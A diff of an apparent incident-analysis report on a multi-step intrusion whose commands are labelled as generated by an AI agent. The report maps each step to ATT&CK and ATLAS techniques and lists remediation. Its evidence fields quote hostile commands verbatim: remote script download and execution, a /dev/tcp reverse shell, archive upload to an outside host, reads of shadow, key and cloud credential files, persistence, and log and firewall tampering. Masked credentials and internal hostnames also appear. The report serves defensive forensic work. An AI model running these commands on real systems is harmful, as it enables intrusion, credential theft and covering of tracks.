@@ -2,12 +2,14 @@
   {
     "item": "files",
     "section": "summary",
-    "value": 11,
+    "value": 14,
     "detail": null,
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "scripts",
@@ -17,47 +19,69 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "outputs",
+    "section": "summary",
+    "value": 7,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "indicators",
+    "section": "summary",
+    "value": 15,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "indicators Domain",
     "section": "summary",
     "value": 4,
     "detail": null,
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
-    "item": "indicators",
-    "section": "summary",
-    "value": 8,
-    "detail": null,
-    "basis": null,
-    "files": null,
-    "attack": null,
-    "atlas": null
-  },
-  {
-    "item": "indicators Domain",
+    "item": "indicators Email",
     "section": "summary",
     "value": 1,
     "detail": null,
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators IPv4",
     "section": "summary",
-    "value": 4,
+    "value": 7,
     "detail": null,
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators URL",
@@ -67,7 +91,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities",
@@ -77,7 +103,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities AccountCreation",
@@ -87,7 +115,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ArchiveCreation",
@@ -97,7 +127,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities CloudMetadataAccess",
@@ -107,7 +139,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ClusterSecretRead",
@@ -117,7 +151,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ContainerEscape",
@@ -127,7 +163,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities CredentialFileRead",
@@ -137,7 +175,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities FileUpload",
@@ -147,7 +187,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities FirewallDisabling",
@@ -157,7 +199,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities HistoryClearing",
@@ -167,7 +211,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities HistoryDisabling",
@@ -177,7 +223,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities LogDeletion",
@@ -187,7 +235,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities PrivateKeyRead",
@@ -197,7 +247,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ReverseShell",
@@ -207,7 +259,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ScheduledJobCreation",
@@ -217,7 +271,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities SecurityToolDisabling",
@@ -227,7 +283,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ServiceDiscovery",
@@ -237,7 +295,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities SetuidBit",
@@ -247,7 +307,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities SetuidFileSearch",
@@ -257,7 +319,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ShadowFileRead",
@@ -267,7 +331,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ShellDownloadAndExecute",
@@ -277,7 +343,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ShellHistoryRead",
@@ -287,7 +355,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities ShellProfilePersistence",
@@ -297,7 +367,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities SshKeyPersistence",
@@ -307,7 +379,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities SudoersModification",
@@ -317,7 +391,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities SystemdUnitCreation",
@@ -327,7 +403,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities Timestomp",
@@ -337,7 +415,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "tactics",
@@ -347,7 +427,81 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed",
+    "section": "summary",
+    "value": 19,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed password",
+    "section": "summary",
+    "value": 3,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed username",
+    "section": "summary",
+    "value": 7,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed email",
+    "section": "summary",
+    "value": 1,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed device",
+    "section": "summary",
+    "value": 2,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed ip",
+    "section": "summary",
+    "value": 6,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20261022_090000_step01_recon.sh",
@@ -355,9 +509,11 @@
     "value": "high",
     "detail": "CloudMetadataAccess",
     "basis": null,
-    "files": "suid_20261022_090030.txt, meta_20261022_090040.txt",
+    "files": "passwd_20261022_090020.txt, hosts_20261022_090025.txt, suid_20261022_090030.txt, meta_20261022_090040.txt",
     "attack": "T1083, T1552.005, T1007",
-    "atlas": "AML.T0055"
+    "atlas": "AML.T0055",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20261022_090500_step02_creds.sh",
@@ -365,9 +521,11 @@
     "value": "high",
     "detail": "ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, ClusterSecretRead",
     "basis": null,
-    "files": "shadow_20261022_090530.txt",
+    "files": "shadow_20261022_090530.txt, env_20261022_090540.txt",
     "attack": "T1003.008, T1552.004, T1552.001, T1552.003, T1552.007",
-    "atlas": "AML.T0090, AML.T0055"
+    "atlas": "AML.T0090, AML.T0055",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20261022_091000_step03_privesc.sh",
@@ -377,7 +535,9 @@
     "basis": null,
     "files": null,
     "attack": "T1548.003, T1548.001, T1611",
-    "atlas": "AML.T0105"
+    "atlas": "AML.T0105",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20261022_091500_step04_persist.sh",
@@ -387,7 +547,9 @@
     "basis": null,
     "files": null,
     "attack": "T1053.003, T1053.002, T1053.006, T1543.002, T1136.001, T1098.004, T1546.004",
-    "atlas": "AML.T0125, AML.T0142"
+    "atlas": "AML.T0125, AML.T0142",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20261022_092000_step05_evade.sh",
@@ -397,7 +559,9 @@
     "basis": null,
     "files": null,
     "attack": "T1685.006, T1070.003, T1690, T1685, T1685.004, T1686, T1070.006",
-    "atlas": "AML.T0138"
+    "atlas": "AML.T0138",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20261022_092500_step06_stage.sh",
@@ -407,7 +571,9 @@
     "basis": null,
     "files": null,
     "attack": "T1048, T1560.001, T1059.004, T1105",
-    "atlas": "AML.T0025, AML.T0072, AML.T0050"
+    "atlas": "AML.T0025, AML.T0072, AML.T0050",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20261022_093000_step07_channel.py",
@@ -417,7 +583,9 @@
     "basis": null,
     "files": null,
     "attack": "T1059.004, T1095",
-    "atlas": "AML.T0050"
+    "atlas": "AML.T0050",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "audit_20261022_093500.jsonl",
@@ -427,7 +595,237 @@
     "basis": null,
     "files": null,
     "attack": "T1053.003, T1053.002, T1053.006, T1136.001, T1685, T1685.004, T1686",
-    "atlas": "AML.T0125"
+    "atlas": "AML.T0125",
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "$6********f (47 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: hash of deploy, collected",
+    "basis": null,
+    "files": "shadow_20261022_090530.txt:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "Fi********1 (15 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: password of app_rw, collected",
+    "basis": null,
+    "files": "env_20261022_090540.txt:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "fi********9 (24 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: token fi********9 (24 chars), collected",
+    "basis": null,
+    "files": "env_20261022_090540.txt:5",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "alerts@corp.example",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "env_20261022_090540.txt:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "app_rw",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "passwd_20261022_090020.txt:4, env_20261022_090540.txt:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "daemon",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "passwd_20261022_090020.txt:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "deploy",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "passwd_20261022_090020.txt:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "root",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "passwd_20261022_090020.txt:1, audit_20261022_093500.jsonl:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "svc",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "audit_20261022_093500.jsonl:1",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "ops",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: used",
+    "basis": null,
+    "files": "20261022_092500_step06_stage.sh:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "alerts@corp.example",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "email: collected",
+    "basis": null,
+    "files": "env_20261022_090540.txt:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "build01.corp.internal",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "hosts_20261022_090025.txt:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "db01.corp.internal",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "hosts_20261022_090025.txt:2, env_20261022_090540.txt:1",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "10.20.30.5",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: collected",
+    "basis": null,
+    "files": "hosts_20261022_090025.txt:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "10.20.30.6",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: collected",
+    "basis": null,
+    "files": "hosts_20261022_090025.txt:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "169.254.169.254",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: used",
+    "basis": null,
+    "files": "20261022_090000_step01_recon.sh:9",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "198.51.100.7",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: used",
+    "basis": null,
+    "files": "20261022_092500_step06_stage.sh:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "203.0.113.40",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: used",
+    "basis": null,
+    "files": "20261022_092500_step06_stage.sh:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "203.0.113.41",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: used",
+    "basis": null,
+    "files": "20261022_093000_step07_channel.py:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "Privileged access obtained",
@@ -437,17 +835,21 @@
     "basis": "SudoersModification, SetuidBit, ContainerEscape",
     "files": "20261022_091000_step03_privesc.sh",
     "attack": "T1548.003, T1548.001, T1611",
-    "atlas": "AML.T0105"
+    "atlas": "AML.T0105",
+    "targets": "file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host",
+    "evidence": "SudoersModification: echo \"$RULE\" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)\nSetuidBit: chmod u+s \"$F\" (20261022_091000_step03_privesc.sh:4)\nContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)"
   },
   {
     "item": "Credentials exposed",
     "section": "impact",
     "value": "high",
     "detail": "Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.",
-    "basis": "ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead",
-    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh",
+    "basis": "ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password",
+    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, env_20261022_090540.txt, shadow_20261022_090530.txt",
     "attack": "T1552.005, T1003.008, T1552.004, T1552.001, T1552.003, T1552.007",
-    "atlas": "AML.T0055, AML.T0090"
+    "atlas": "AML.T0055, AML.T0090",
+    "targets": "file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fi********9 (24 chars)",
+    "evidence": "ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)\nPrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)\nCredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)\nShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)\nCloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)\nClusterSecretRead: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)"
   },
   {
     "item": "Persistence established",
@@ -457,7 +859,9 @@
     "basis": "ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools",
     "files": "20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attack": "T1053.003, T1053.002, T1053.006, T1543.002, T1136.001, T1098.004, T1546.004",
-    "atlas": "AML.T0125, AML.T0142"
+    "atlas": "AML.T0125, AML.T0142",
+    "targets": "unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc",
+    "evidence": "ScheduledJobCreation: (crontab -l; echo \"$JOB\") | crontab - (20261022_091500_step04_persist.sh:3)\nScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)\nSystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)\nSystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)\nAccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)\nAccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)\nSshKeyPersistence: echo \"$KEY\" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)\nShellProfilePersistence: echo \"$LINE\" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)\nuseradd: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)"
   },
   {
     "item": "Data collected",
@@ -467,7 +871,9 @@
     "basis": "ArchiveCreation, Collection tools",
     "files": "20261022_092500_step06_stage.sh",
     "attack": "T1560.001",
-    "atlas": null
+    "atlas": null,
+    "targets": "archive out.tgz",
+    "evidence": "ArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)\ngzip: gzip {} (20261022_092500_step06_stage.sh:7)"
   },
   {
     "item": "Data may have left the environment",
@@ -477,7 +883,9 @@
     "basis": "FileUpload, Exfiltration tools",
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1048",
-    "atlas": "AML.T0025"
+    "atlas": "AML.T0025",
+    "targets": "url https://files.example.net/up; file out.tgz",
+    "evidence": "FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)\nnc: nc -zv 203.0.113.41 443 (20261022_093000_step07_channel.py:7)"
   },
   {
     "item": "Outside hosts contacted",
@@ -487,7 +895,9 @@
     "basis": "ShellDownloadAndExecute, ReverseShell",
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1059.004, T1105, T1095",
-    "atlas": "AML.T0072, AML.T0050"
+    "atlas": "AML.T0072, AML.T0050",
+    "targets": "url http://203.0.113.40/s.sh; host 203.0.113.41 ($H)",
+    "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)\nReverseShell: os.system(\"exec 3<>/dev/tcp/$H/$PORT\") (20261022_093000_step07_channel.py:8)"
   },
   {
     "item": "Movement to other systems",
@@ -497,7 +907,9 @@
     "basis": "LateralMovement tools",
     "files": "20261022_092500_step06_stage.sh",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": "ssh: ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)"
   },
   {
     "item": "Defences and logging impaired",
@@ -507,7 +919,9 @@
     "basis": "LogDeletion, HistoryDisabling, SecurityToolDisabling, FirewallDisabling, DefenseImpairment tools",
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": "T1685.006, T1690, T1685, T1685.004, T1686",
-    "atlas": null
+    "atlas": null,
+    "targets": "log /var/log/auth.log; setting HISTFILE; service auditd",
+    "evidence": "LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)\nHistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)\nSecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)\nSecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)\nFirewallDisabling: iptables -F (20261022_092000_step05_evade.sh:5)\nFirewallDisabling: iptables -F (audit_20261022_093500.jsonl)\niptables: iptables -F (audit_20261022_093500.jsonl)"
   },
   {
     "item": "Code run outside normal controls",
@@ -517,7 +931,9 @@
     "basis": "ShellDownloadAndExecute",
     "files": "20261022_092500_step06_stage.sh",
     "attack": "T1059.004, T1105",
-    "atlas": "AML.T0072, AML.T0050"
+    "atlas": "AML.T0072, AML.T0050",
+    "targets": "url http://203.0.113.40/s.sh",
+    "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)"
   },
   {
     "item": "Traces hidden",
@@ -527,7 +943,9 @@
     "basis": "HistoryClearing, Timestomp",
     "files": "20261022_092000_step05_evade.sh",
     "attack": "T1070.003, T1070.006",
-    "atlas": "AML.T0138"
+    "atlas": "AML.T0138",
+    "targets": null,
+    "evidence": "HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)\nTimestomp: touch -r /bin/ls \"$F\" (20261022_092000_step05_evade.sh:8)"
   },
   {
     "item": "Commands generated by an AI agent",
@@ -537,17 +955,21 @@
     "basis": "the premise of the tool",
     "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": null,
-    "atlas": "AML.T0102"
+    "atlas": "AML.T0102",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "Environment mapped",
     "section": "impact",
     "value": "low",
     "detail": "Identities, resources or configuration were listed. Later steps were probably aimed with the result.",
-    "basis": "SetuidFileSearch, ServiceDiscovery, Discovery tools",
-    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_092500_step06_stage.sh",
+    "basis": "SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip",
+    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl, env_20261022_090540.txt, hosts_20261022_090025.txt, passwd_20261022_090020.txt",
     "attack": "T1083, T1007",
-    "atlas": null
+    "atlas": null,
+    "targets": "searched /; service sshd; username alerts@corp.example; username app_rw; username daemon; username deploy; username root; username svc; email alerts@corp.example; device build01.corp.internal; device db01.corp.internal; ip 10.20.30.5; ip 10.20.30.6",
+    "evidence": "SetuidFileSearch: find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)\nServiceDiscovery: systemctl status sshd (20261022_090000_step01_recon.sh:7)\nid: id (20261022_090000_step01_recon.sh:3)\nuname: uname -a (20261022_090000_step01_recon.sh:3)\nkubectl: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)\ndocker: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)\nfind: find /srv -name '*.bak' -exec gzip {} \\; (20261022_092500_step06_stage.sh:7)\nid: id (20261022_092500_step06_stage.sh:1)\nuname: uname -a (20261022_092500_step06_stage.sh:1)"
   },
   {
     "item": "Revoke sessions and reset identities",
@@ -557,17 +979,21 @@
     "basis": "LateralMovement tools",
     "files": "20261022_092500_step06_stage.sh",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": "ssh: ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)"
   },
   {
     "item": "Rotate what was read",
     "section": "remediation",
     "value": "high",
     "detail": "Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.",
-    "basis": "ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead",
-    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh",
+    "basis": "ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password",
+    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, env_20261022_090540.txt, shadow_20261022_090530.txt",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fi********9 (24 chars)",
+    "evidence": "ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)\nPrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)\nCredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)\nShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)\nCloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)\nClusterSecretRead: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)"
   },
   {
     "item": "Remove persistence",
@@ -577,7 +1003,9 @@
     "basis": "ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools",
     "files": "20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc",
+    "evidence": "ScheduledJobCreation: (crontab -l; echo \"$JOB\") | crontab - (20261022_091500_step04_persist.sh:3)\nScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)\nSystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)\nSystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)\nAccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)\nAccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)\nSshKeyPersistence: echo \"$KEY\" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)\nShellProfilePersistence: echo \"$LINE\" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)\nuseradd: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)"
   },
   {
     "item": "Undo privilege changes on hosts",
@@ -587,7 +1015,9 @@
     "basis": "SudoersModification, SetuidBit, ContainerEscape",
     "files": "20261022_091000_step03_privesc.sh",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host",
+    "evidence": "SudoersModification: echo \"$RULE\" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)\nSetuidBit: chmod u+s \"$F\" (20261022_091000_step03_privesc.sh:4)\nContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)"
   },
   {
     "item": "Restore security tooling",
@@ -597,7 +1027,9 @@
     "basis": "SecurityToolDisabling, FirewallDisabling",
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": null,
